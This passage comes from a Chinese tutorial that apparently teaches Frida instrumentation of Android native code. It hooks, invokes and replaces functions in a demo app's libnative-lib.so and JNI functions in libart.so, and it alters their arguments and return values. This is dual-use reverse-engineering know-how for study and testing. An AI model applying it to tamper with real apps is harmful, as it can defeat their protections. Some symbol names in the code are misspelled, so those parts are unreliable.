v5add_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(v5add_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x =&gt; &quot;</span>, args[<span class="number">0</span>], <span class="string">&quot;y =&gt; &quot;</span>, args[<span class="number">1</span>])</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval =&gt; &quot;</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//主动调用</span></span><br><span class="line">    <span class="keyword">var</span> v5add = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(v5add_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;int&quot;</span>,<span class="string">&quot;int&quot;</span>])</span><br><span class="line">    <span class="comment">//修改参数</span></span><br><span class="line">    <span class="keyword">var</span> v5add_result = <span class="title function_">v5add</span>(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke result =&gt; &quot;</span>,v5add_result)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hookandinvoke_add)</span><br></pre></td></tr></table></figure><p>上面是一个简单的主动调用并修改参数，现在对<code>myfirstjniJNI()</code>主动调用试试。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_nativelib</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> myfirstjniJNI = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_example_demoso1_MainActivity_myfirstjniJNI&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;myfirstjniJNI addr =&gt; &quot;</span>, myfirstjniJNI)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对myfirstjniJNI()主动调用</span></span><br><span class="line">    <span class="keyword">var</span> myfirstjniJNI_invoke = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(myfirstjniJNI,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(myfirstjniJNI,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Interceptor.attach myfirstjniJNI args:&quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>])</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args2 jstring is &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(args[<span class="number">2</span>],<span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">            <span class="comment">//主动调用</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;myfirstjniJNI_invoke result =&gt; &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(<span class="title function_">myfirstjniJNI_invoke</span>(args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>]),<span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> newArgs2 = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">newStringUtf</span>(<span class="string">&quot;new Args2 from frida&quot;</span>)</span><br><span class="line">            args[<span class="number">2</span>] = newArgs2</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Interceptor.attach myfirstjniJNI retval =&gt; &quot;</span>,retval)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval jstring is &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(retval,<span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">            <span class="keyword">var</span> newRetval = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">newStringUtf</span>(<span class="string">&quot;new Retval from frida&quot;</span>)</span><br><span class="line">            retval.<span class="title function_">replace</span>(newRetval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_nativelib)</span><br></pre></td></tr></table></figure><h2 id="8-3-替换值"><a href="#8-3-替换值" class="headerlink" title="8.3 替换值"></a>8.3 替换值</h2><p>修改参数和返回值也可以用<code>Interceptor.replace()</code>方法，但比较少用，一般<code>Interceptor.attach()</code>就够用了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_replace</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> myfirstjniJNI = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_example_demoso1_MainActivity_myfirstjniJNI&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;myfirstjniJNI addr =&gt; &quot;</span>, myfirstjniJNI)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对myfirstjniJNI()主动调用</span></span><br><span class="line">    <span class="keyword">var</span> myfirstjniJNI_invoke = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(myfirstjniJNI,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(myfirstjniJNI,<span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span>(<span class="params">args0, args1, args2</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Interceptor.replace myfirstjniJNI args:&quot;</span>, args0, args1, args2)</span><br><span class="line">        <span class="comment">//var result = myfirstjniJNI_invoke(args0,args1,args2)</span></span><br><span class="line">        <span class="comment">//return result</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">newStringUtf</span>(<span class="string">&quot;new Retval from frida&quot;</span>)</span><br><span class="line">    &#125;,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>]))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_replace)</span><br></pre></td></tr></table></figure><h2 id="8-4-调用栈"><a href="#8-4-调用栈" class="headerlink" title="8.4 调用栈"></a>8.4 调用栈</h2><p>在<code>add()</code>的Native函数中添加调用栈：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookandinvoke_add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> v5add_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;_Z5v5addii&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;v5add addr =&gt; &quot;</span>, v5add_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(v5add_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x =&gt; &quot;</span>, args[<span class="number">0</span>], <span class="string">&quot;y =&gt; &quot;</span>, args[<span class="number">1</span>])</span><br><span class="line">            <span class="comment">//调用栈</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;CCCryptorCreate called from:\n&quot;</span> + <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval =&gt; &quot;</span>,retval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//主动调用</span></span><br><span class="line">    <span class="keyword">var</span> v5add = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(v5add_addr,<span class="string">&quot;int&quot;</span>,[<span class="string">&quot;int&quot;</span>,<span class="string">&quot;int&quot;</span>])</span><br><span class="line">    <span class="keyword">var</span> v5add_result = <span class="title function_">v5add</span>(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;invoke result =&gt; &quot;</span>,v5add_result)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hookandinvoke_add)</span><br></pre></td></tr></table></figure><h2 id="8-5-枚举"><a href="#8-5-枚举" class="headerlink" title="8.5 枚举"></a>8.5 枚举</h2><p>想要在众多so中找到某个Native函数，如果这个APK没有做动态注册(JNI_Onload)，我们可以使用枚举将函数打印出来，或导出到文件对应去找。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">EnumerateAllExports</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> modules = <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>()</span><br><span class="line">    <span class="comment">//console.log(&quot;Process.enumerateModules =&gt; &quot;,JSON.stringfy(modules))</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;modules.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable language_">module</span> = modules[i]</span><br><span class="line">        <span class="keyword">var</span> module_name = modules[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="variable language_">module</span>.<span class="title function_">enumerateExports</span>()        </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;module_name =&gt; &quot;</span>,module_name,<span class="string">&quot;module.enumerateExports =&gt; &quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title class_">EnumerateAllExports</span>)</span><br></pre></td></tr></table></figure><h2 id="8-6-Process、Thread、Module、Memory"><a href="#8-6-Process、Thread、Module、Memory" class="headerlink" title="8.6 Process、Thread、Module、Memory"></a>8.6 Process、Thread、Module、Memory</h2><p>这些用法可直接在<a href="https://frida.re/docs/javascript-api/#process">Frida指南 JavaScript API</a>中找到。</p><p>打开某一个应用程序，开启frida-server，在Kali命令窗口中输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -UF</span><br></pre></td></tr></table></figure><p>即可attach上该应用程序。</p><h3 id="8-6-1-Process"><a href="#8-6-1-Process" class="headerlink" title="8.6.1 Process"></a>8.6.1 Process</h3><p>可以直接在命令窗口输入。</p><img src="/posts/ab7319a3/15.10.1.png" class=""><img src="/posts/ab7319a3/15.10.2.png" class=""><h3 id="8-6-2-Module"><a href="#8-6-2-Module" class="headerlink" title="8.6.2 Module"></a>8.6.2 Module</h3><p>也可以写js代码。比如枚举导入表函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MODULE</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Process</span>.<span class="title function_">findModuleByAddress</span>(<span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(native_lib_addr))</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;enumerateImports =&gt; &quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(native_lib_addr.<span class="title function_">enumerateImports</span>()))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="variable constant_">MODULE</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.10.3.png" class=""><h1 id="9-系统框架层Native-hook"><a href="#9-系统框架层Native-hook" class="headerlink" title="9. 系统框架层Native hook"></a>9. 系统框架层Native hook</h1><h2 id="9-1-JNI框架层的hook利用"><a href="#9-1-JNI框架层的hook利用" class="headerlink" title="9.1 JNI框架层的hook利用"></a>9.1 JNI框架层的hook利用</h2><h3 id="9-1-1-找到函数的地址"><a href="#9-1-1-找到函数的地址" class="headerlink" title="9.1.1 找到函数的地址"></a>9.1.1 找到函数的地址</h3><p>假如我们想要hook <code>GetStrinUTFChars()</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_JNI</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">GetStringUTFChars</span>_addr = <span class="literal">null</span></span><br><span class="line">    <span class="comment">//枚举libart.so中的符号表</span></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>()</span><br><span class="line">    <span class="comment">//查看GetStrinUTFChars()是否在内存中</span></span><br><span class="line">    <span class="comment">//console.log(JSON.stringify(symbols))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//确认存在后发现有两个，对函数进行过滤</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;symbols.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">if</span>((symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;GetStrinUTFChars&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found GetStrinUTFChars name:&quot;</span>, symbol)</span><br><span class="line">                <span class="title class_">GetStringUTFChars</span>_addr = symbols[i].<span class="property">address</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found GetStrinUTFChars address:&quot;</span>, symbol.<span class="property">address</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_JNI)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.11.1.png" class=""><img src="/posts/ab7319a3/15.11.2.png" class=""><h3 id="9-1-2-查看调用栈、参数和返回值"><a href="#9-1-2-查看调用栈、参数和返回值" class="headerlink" title="9.1.2 查看调用栈、参数和返回值"></a>9.1.2 查看调用栈、参数和返回值</h3><p>找到函数的地址后attach这个函数，查看参数和返回值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_JNI</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">GetStringUTFChars</span>_addr = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>()</span><br><span class="line">    <span class="comment">//查看GetStrinUTFChars()是否在内存中</span></span><br><span class="line">    <span class="comment">//console.log(JSON.stringify(symbols))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//确认存在后发现有两个，对函数进行过滤</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;symbols.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">if</span>((symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;GetStrinUTFChars&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found GetStrinUTFChars name:&quot;</span>, symbol)</span><br><span class="line">                <span class="title class_">GetStringUTFChars</span>_addr = symbols[i].<span class="property">address</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found GetStrinUTFChars address:&quot;</span>, <span class="title class_">GetStringUTFChars</span>_addr)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">GetStringUTFChars</span>_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;GetStringUTFChars(_JNIEnv*, _jstring*, unsigned char*) =&gt; &quot;</span>, args[<span class="number">0</span>],<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(args[<span class="number">1</span>],<span class="literal">null</span>).<span class="title function_">readCString</span>(),args[<span class="number">1</span>],args[<span class="number">2</span>])</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//因为hook的是系统层，所以会有其他程序的参数和返回值干扰，所以可以通过调用栈查看哪个是我们想要的</span></span><br><span class="line">            <span class="comment">//console.log(&quot;CCCryptorCreate called from:\n&quot; + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join(&#x27;\n&#x27;) + &#x27;\n&#x27;)      </span></span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval =&gt; &quot;</span>,retval.<span class="title function_">readCString</span>())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_JNI)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.11.3.png" class=""><h3 id="9-1-3-修改参数和返回值"><a href="#9-1-3-修改参数和返回值" class="headerlink" title="9.1.3 修改参数和返回值"></a>9.1.3 修改参数和返回值</h3><p>如果要将参数或返回值替换，可以直接在attach中new一个，也可以使用15.1.7的知识，使用replace来替换参数或返回值。首先还是把函数的参数和返回值打印出来，确保无误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">replace_JNI</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTF</span>_addr = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title function_">enumerateSymbols</span>()</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;symbols.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i].<span class="property">name</span></span><br><span class="line">        <span class="keyword">if</span>((symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span>) &amp;&amp; (symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;JNI&quot;</span>) &gt;= <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(symbol.<span class="title function_">indexOf</span>(<span class="string">&quot;NewStrinUTF&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found NewStrinUTF name:&quot;</span>, symbol)</span><br><span class="line">                <span class="title class_">NewStringUTF</span>_addr = symbols[i].<span class="property">address</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;finally found NewStrinUTF address:&quot;</span>, <span class="title class_">NewStringUTF</span>_addr)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTF</span> = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">NewStringUTF</span>_addr,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>])</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(<span class="title class_">NewStringUTF</span>_addr,<span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span>(<span class="params">args1,args2</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1,args2 =&gt; &quot;</span>,args1, args2)</span><br><span class="line">        <span class="title class_">NewStringUTF</span>(args1,args2)</span><br><span class="line">    &#125;,<span class="string">&quot;pointer&quot;</span>,[<span class="string">&quot;pointer&quot;</span>,<span class="string">&quot;pointer&quot;</span>]))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(replace_JNI)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/15.11.4.png" class=""><p>查看调用栈，发现有其它程序的<code>NewStringUTF()</code>输出，此时如果直接修改参数或返回值可能会导致其他程序出现错误，但目标程序的目标函数的参数确实是被替换掉了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">replace_JNI</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTF</span>_addr = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">var</span> symbols = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;libart.so&quot;</span>).<span class="title 